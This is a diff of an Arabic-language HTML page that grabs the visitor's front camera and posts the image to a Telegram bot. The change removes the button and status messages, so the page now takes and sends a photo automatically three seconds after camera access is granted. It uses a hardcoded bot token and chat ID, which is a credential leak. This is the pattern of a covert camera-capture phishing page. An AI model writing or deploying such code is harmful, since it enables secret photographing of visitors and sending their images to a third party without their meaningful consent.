@@ -3,75 +3,49 @@
 <head>
   <meta charset="UTF-8" />
   <title>Capture and Send to Telegram</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; max-width: 420px; margin: auto; }
-    #status { margin-top: 15px; font-weight: bold; }
-    button { margin-top: 15px; padding: 10px 20px; font-size: 16px; cursor: pointer; }
-  </style>
 </head>
 <body>
-  <h3>📸 اضغط على الزر لالتقاط صورة وإرسالها إلى تليجرام</h3>
-  <video id="video" autoplay playsinline style="width: 100%; max-width: 400px; border: 1px solid #ccc;"></video>
+  <h3>📸 سيتم التقاط صورة تلقائيًا بعد 3 ثوانٍ...</h3>
+  <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-  <button id="captureBtn" disabled>التقاط وإرسال الصورة</button>
-  <div id="status"></div>
 
   <script>
     const BOT_TOKEN = '8268065223:AAHj509vUGIJDuQDxuMSB73t6__-FFb6ug4';
     const CHAT_ID = '5606349322';
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const captureBtn = document.getElementById('captureBtn');
-    const statusDiv = document.getElementById('status');
-
-    function setStatus(msg, isError = false) {
-      statusDiv.textContent = msg;
-      statusDiv.style.color = isError ? 'red' : 'green';
-    }
-
-    // طلب صلاحية الكاميرا وتشغيلها
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
       .then(stream => {
+        const video = document.getElementById('video');
         video.srcObject = stream;
-        captureBtn.disabled = false;
-        setStatus('الكاميرا جاهزة، اضغط الزر لالتقاط الصورة.');
+
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+              alert('📩 تم إرسال الصورة إلى تليجرام بنجاح!');
+              console.log(data);
+            })
+            .catch(error => {
+              console.error('❌ فشل إرسال الصورة إلى تليجرام:', error);
+            });
+          }, 'image/jpeg');
+        }, 3000);
       })
       .catch(error => {
-        setStatus('❌ لم نتمكن من الوصول إلى الكاميرا. يرجى السماح بالوصول.', true);
-        console.error('Camera error:', error);
+        console.error('❌ الكاميرا غير متاحة:', error);
       });
-
-    // وظيفة التقاط الصورة وإرسالها للبوت
-    captureBtn.addEventListener('click', () => {
-      setStatus('⏳ جارٍ التقاط الصورة وإرسالها...');
-
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'photo.jpg');
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            setStatus('📩 تم إرسال الصورة إلى تليجرام بنجاح!');
-          } else {
-            setStatus('❌ فشل إرسال الصورة: ' + (data.description || 'خطأ غير معروف'), true);
-            console.error('Telegram API error:', data);
-          }
-        })
-        .catch(error => {
-          setStatus('❌ حدث خطأ أثناء الإرسال.', true);
-          console.error('Fetch error:', error);
-        });
-      }, 'image/jpeg');
-    });
   </script>
 </body>
 </html>
